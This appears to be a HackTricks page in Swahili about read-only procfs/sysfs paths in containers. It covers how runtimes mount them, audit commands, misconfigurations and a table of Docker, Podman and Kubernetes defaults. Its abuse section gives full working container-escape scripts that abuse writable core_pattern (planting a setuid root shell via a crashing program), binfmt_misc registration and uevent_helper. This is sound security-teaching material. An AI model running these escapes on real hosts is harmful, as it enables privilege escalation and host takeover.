# Njia za Mfumo za Kusoma Tu

{{#include ../../../../banners/hacktricks-training.md}}

Njia za mfumo za kusoma tu ni ulinzi tofauti na masked paths. Badala ya kuficha path kabisa, runtime huiweka wazi lakini hui-mount ikiwa ya kusoma tu. Hili ni jambo la kawaida kwa maeneo yaliyochaguliwa ya procfs na sysfs ambapo access ya kusoma inaweza kukubalika au kuwa muhimu kiutendaji, lakini kuandika kunaweza kuwa hatari sana.

Madhumuni ni rahisi: interfaces nyingi za kernel huwa hatari zaidi zinapoweza kuandikwa. Mount ya kusoma tu haiondoi thamani yote ya reconnaissance, lakini huzuia workload iliyoathirika kurekebisha files zinazohusiana na kernel kupitia path hiyo.

## Uendeshaji

Runtimes mara nyingi huweka sehemu za mwonekano wa proc/sys kuwa za kusoma tu. Kulingana na runtime na host, hii inaweza kujumuisha paths kama:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Orodha halisi hutofautiana, lakini model ni ileile: ruhusu visibility inapohitajika, na ukatae mutation kwa default.

## Lab

Kagua orodha ya paths za kusoma tu iliyotangazwa na Docker:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Kagua mwonekano wa proc/sys uliowekwa mount kutoka ndani ya container:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Athari za Usalama

Njia za mfumo za kusoma-tu hupunguza aina kubwa ya matumizi mabaya yanayoathiri host. Hata attacker anapoweza kukagua procfs au sysfs, kutoweza kuandika humo huondoa njia nyingi za moja kwa moja za kufanya mabadiliko zinazohusisha kernel tunables, crash handlers, module-loading helpers, au control interfaces nyingine. Exposure haijaondoka, lakini kubadilika kutoka information disclosure hadi kuathiri host kunakuwa kugumu zaidi.

## Mipangilio Isiyo Sahihi

Makosa makuu ni kuondoa masking au ku-mount tena njia nyeti zikiwa read-write, kufichua moja kwa moja maudhui ya host proc/sys kwa kutumia writable bind mounts, au kutumia privileged modes ambazo kwa ufanisi hupita runtime defaults salama zaidi. Kwenye Kubernetes, `procMount: Unmasked` na privileged workloads mara nyingi huenda pamoja na proc protection dhaifu. Kosa lingine la kawaida la kiutendaji ni kudhani kwamba kwa sababu runtime kwa kawaida hu-mount njia hizi zikiwa read-only, workloads zote bado zinarithi default hiyo.

## Matumizi Mabaya

Ikiwa protection ni dhaifu, anza kwa kutafuta proc/sys entries zinazoweza kuandikwa:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Wakati maingizo yanayoweza kuandikwa yanapokuwepo, njia zenye thamani kubwa za hatua zinazofuata zinajumuisha:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Kile ambacho commands hizi zinaweza kufichua:

- Entries zinazoandikika chini ya `/proc/sys` mara nyingi humaanisha kuwa container inaweza kurekebisha tabia ya host kernel badala ya kuichunguza tu.
- `core_pattern` ni muhimu hasa kwa sababu value inayoelekeza kwenye host na inayoweza kuandikwa inaweza kubadilishwa kuwa njia ya host code-execution kwa ku-crash process baada ya kuweka pipe handler.
- `modprobe` hufichua helper inayotumiwa na kernel kwa michakato inayohusiana na module-loading; ni lengo la kawaida lenye thamani kubwa ikiwa inaweza kuandikwa.
- `binfmt_misc` hukuambia ikiwa usajili wa custom interpreter unawezekana. Ikiwa usajili unaweza kuandikwa, hii inaweza kuwa execution primitive badala ya information leak tu.
- `panic_on_oom` hudhibiti uamuzi wa kernel unaohusu host nzima na kwa hivyo inaweza kubadilisha resource exhaustion kuwa host denial of service.
- `uevent_helper` ni mojawapo ya mifano iliyo wazi zaidi ambapo writable sysfs helper path husababisha host-context execution.

Findings zinazovutia zinajumuisha proc knobs au sysfs entries zinazoelekeza kwenye host na zinazoandikika, ingawa kwa kawaida zinapaswa kuwa read-only. Katika hatua hiyo, workload imehama kutoka kwenye mtazamo wenye vikwazo wa container kuelekea ushawishi wa maana juu ya kernel.

### Mfano Kamili: `core_pattern` Host Escape

Ikiwa `/proc/sys/kernel/core_pattern` inaweza kuandikwa kutoka ndani ya container na inaelekeza kwenye mtazamo wa host kernel, inaweza kutumiwa vibaya ku-execute payload baada ya crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Ikiwa path hiyo inafikia kweli host kernel, payload itaendeshwa kwenye host na kuacha setuid shell nyuma.

### Mfano Kamili: Usajili wa `binfmt_misc`

Ikiwa `/proc/sys/fs/binfmt_misc/register` inaweza kuandikiwa, usajili wa interpreter maalum unaweza kusababisha code execution wakati faili linalolingana linapoendeshwa:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Kwenye `binfmt_misc` inayokabili host na inayoweza kuandikwa, matokeo ni code execution katika interpreter path inayoanzishwa na kernel.

### Mfano Kamili: `uevent_helper`

Ikiwa `/sys/kernel/uevent_helper` inaweza kuandikwa, kernel inaweza kuita host-path helper wakati event inayolingana inapoanzishwa:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Sababu ya hii kuwa hatari sana ni kwamba path ya helper hutatuliwa kwa mtazamo wa filesystem ya host badala ya context salama ya container pekee.

## Ukaguzi

Ukaguzi huu huamua ikiwa mwonekano wa procfs/sysfs ni wa kusoma pekee inapotarajiwa kuwa hivyo na ikiwa workload bado inaweza kurekebisha kernel interfaces nyeti.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Ni nini kinachovutia hapa:

- Workload ya kawaida iliyofanyiwa hardening inapaswa kufichua entries chache sana za proc/sys zinazoweza kuandikwa.
- Njia za `/proc/sys` zinazoweza kuandikwa mara nyingi ni muhimu zaidi kuliko access ya kawaida ya kusoma.
- Ikiwa runtime inasema kuwa path ni read-only lakini kiuhalisia inaweza kuandikwa, kagua kwa makini mount propagation, bind mounts, na mipangilio ya privilege.

## Chaguo-msingi za Runtime

| Runtime / platform | Hali ya chaguo-msingi | Tabia ya chaguo-msingi | Kudhoofisha kwa mikono kunakotumika mara kwa mara |
| --- | --- | --- | --- |
| Docker Engine | Imewezeshwa kwa chaguo-msingi | Docker huweka orodha ya chaguo-msingi ya paths za read-only kwa proc entries nyeti | kufichua mounts za proc/sys za host, `--privileged` |
| Podman | Imewezeshwa kwa chaguo-msingi | Podman hutumia paths za chaguo-msingi za read-only isipokuwa zilegezwapo waziwazi | `--security-opt unmask=ALL`, mounts pana za host, `--privileged` |
| Kubernetes | Hurithi chaguo-msingi za runtime | Hutumia muundo wa runtime wa paths za read-only isipokuwa udhoofishwe na mipangilio ya Pod au host mounts | `procMount: Unmasked`, workloads zenye privilege, host proc/sys mounts zinazoweza kuandikwa |
| containerd / CRI-O under Kubernetes | Chaguo-msingi za runtime | Kwa kawaida hutegemea chaguo-msingi za OCI/runtime | sawa na safu ya Kubernetes; mabadiliko ya moja kwa moja ya runtime config yanaweza kudhoofisha tabia hii |

Jambo kuu ni kwamba system paths za read-only kwa kawaida huwepo kama chaguo-msingi la runtime, lakini ni rahisi kuzidhoofisha kwa kutumia privileged modes au host bind mounts.
{{#include ../../../../banners/hacktricks-training.md}}
